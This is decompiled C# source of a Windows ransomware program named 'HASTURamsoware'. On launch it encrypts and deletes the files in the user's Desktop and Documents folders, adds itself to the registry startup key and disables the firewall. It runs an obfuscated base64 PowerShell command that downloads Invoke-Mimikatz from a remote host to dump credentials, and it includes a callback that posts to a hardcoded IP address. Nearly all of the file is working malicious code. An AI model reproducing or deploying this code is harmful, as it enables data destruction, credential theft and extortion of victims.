#define DEBUG
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Encryptor;
using Microsoft.Win32;

namespace HASTURamsoware;

public class Form1 : Form
{
	private static Random random = new Random();

	private static readonly HttpClient client = new HttpClient();

	private IContainer components = null;

	private RichTextBox richTextBox1;

	private Label label1;

	private PictureBox pictureBox1;

	public Form1()
	{
		InitializeComponent();
	}

	private async void Form1_Load(object sender, EventArgs e)
	{
		encripta();
		AddApplicationToStartup();
		RunScript("netsh advfirewall set allprofiles state off");
		Wallpaper wall1 = new Wallpaper();
		wall1.Set(Wallpaper.Style.Stretched);
		try
		{
			try
			{
				RunScript("powershell.exe -nop -NoProfile -WindowStyle 1 -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA== ");
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			Exception ex = ex2;
			MessageBox.Show(ex.Message);
		}
	}

	public static void AddApplicationToStartup()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("hastur", Application.get_ExecutablePath().ToString());
	}

	private string RunScript(string script)
	{
		Runspace val = RunspaceFactory.CreateRunspace();
		val.Open();
		Pipeline val2 = val.CreatePipeline();
		val2.get_Commands().AddScript(script);
		val2.get_Commands().Add("Out-String");
		Collection<PSObject> collection = val2.Invoke();
		val.Close();
		StringBuilder stringBuilder = new StringBuilder();
		foreach (PSObject item in collection)
		{
			stringBuilder.AppendLine(((object)item).ToString());
		}
		return stringBuilder.ToString();
	}

	public static string RandomString(int length)
	{
		return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
			select s[random.Next(s.Length)]).ToArray());
	}

	private static Dictionary<string, string> ReadFile(string file)
	{
		Func<string, string> Subkey = (string Key) => Key switch
		{
			"Hostname" => "ID3", 
			"IdArchivo" => "ID1", 
			"IdEjecucion" => "ID2", 
			"Instance" => "uniqueKey", 
			_ => Key, 
		};
		return File.ReadAllLines(file).Select(delegate(string F)
		{
			string[] array = F.Split(new char[1] { ':' });
			return new KeyValuePair<string, string>(Subkey(array[0].Trim()), array[1].Trim());
		}).ToDictionary((KeyValuePair<string, string> item) => item.Key, (KeyValuePair<string, string> item) => item.Value);
	}

	private static async Task<HttpResponseMessage> SendCallBackAsync(Dictionary<string, string> listP)
	{
		using HttpClient client = new HttpClient();
		client.BaseAddress = new Uri("http://18.219.47.192");
		FormUrlEncodedContent content = new FormUrlEncodedContent(listP);
		return await client.PostAsync("/killswitch.php", content);
	}

	public string RandomString(int size, bool lowerCase)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		for (int i = 0; i < size; i++)
		{
			char value = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
			stringBuilder.Append(value);
		}
		if (lowerCase)
		{
			return stringBuilder.ToString().ToLower();
		}
		return stringBuilder.ToString();
	}

	public static bool RetryUntilSuccessOrTimeout(int timeout)
	{
		Task<bool> task = Task.Run(() => WaitInternet());
		if (!task.Wait(TimeSpan.FromSeconds(timeout)))
		{
			throw new Exception("Timed out");
		}
		return task.Result;
	}

	private static bool WaitInternet()
	{
		bool flag = true;
		while (flag)
		{
			try
			{
				Ping ping = new Ping();
				PingReply pingReply = ping.Send("8.8.8.8");
				Debug.WriteLine(pingReply.Status);
				if (pingReply.Status.ToString() == "Success")
				{
					flag = false;
				}
				Thread.Sleep(500);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}
		return true;
	}

	public void encripta()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] files = Directory.GetFiles(folderPath);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string[] files2 = Directory.GetFiles(folderPath2);
		string rsaKey = "<RSAKeyValue><Modulus>q/s6Zasp5E1UKVKvlgtm8b+xaYrw4UbglzGo7Gn8Tfd+0wdknMtSs7wMI4H98at7Sau67T8pb7noCsxgS/ubutW78CfdQQ9EhSZ0fZRJHRtczKwMlJVy/LS7PqMzEnlnQ2YMj4bJdyQRwFocmZld5ZM2txZyDO+Z0cq7/tlpyzPbUaahi9Qe4zgyAw90fALUukICH6UFrIJBmHv8A5v+CNg5vf0E3FvP2ZxcoLDqcwvX42hPEn9W5qvNfsQ9Q6rmDtBZmDTYOW4KYsA5D5EogQuAlyUYHDxhkj0j/+wNQX9raLJVBeS7Yqol9Y0xWfm5r+4EopAnCzVpALOfDwHNiw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		Thread.Sleep(1000);
		string[] array = files2;
		foreach (string text in array)
		{
			string encryptedFilePath = MakePath(text, ".rthreat");
			string text2 = MakePath(text, ".manifest.xml");
			Encipher.Encrypt(text, encryptedFilePath, text2, rsaKey);
			File.Delete(text2);
			File.Delete(text);
		}
		string[] array2 = files;
		foreach (string text3 in array2)
		{
			string encryptedFilePath2 = MakePath(text3, ".rthreat");
			string text4 = MakePath(text3, ".manifest.xml");
			Encipher.Encrypt(text3, encryptedFilePath2, text4, rsaKey);
			File.Delete(text4);
			File.Delete(text3);
		}
	}

	private static string MakePath(string plainFilePath, string newSuffix)
	{
		string path = Path.GetFileNameWithoutExtension(plainFilePath) + newSuffix;
		return Path.Combine(Path.GetDirectoryName(plainFilePath), path);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Application.Exit();
	}

	private void richTextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		richTextBox1 = new RichTextBox();
		label1 = new Label();
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		componentResourceManager.ApplyResources(richTextBox1, "richTextBox1");
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).add_TextChanged((EventHandler)richTextBox1_TextChanged);
		componentResourceManager.ApplyResources(label1, "label1");
		((Control)label1).set_ForeColor(SystemColors.ButtonHighlight);
		((Control)label1).set_Name("label1");
		((Control)label1).add_Click((EventHandler)label1_Click);
		componentResourceManager.ApplyResources(pictureBox1, "pictureBox1");
		((Control)pictureBox1).set_Name("pictureBox1");
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_Click((EventHandler)pictureBox1_Click);
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
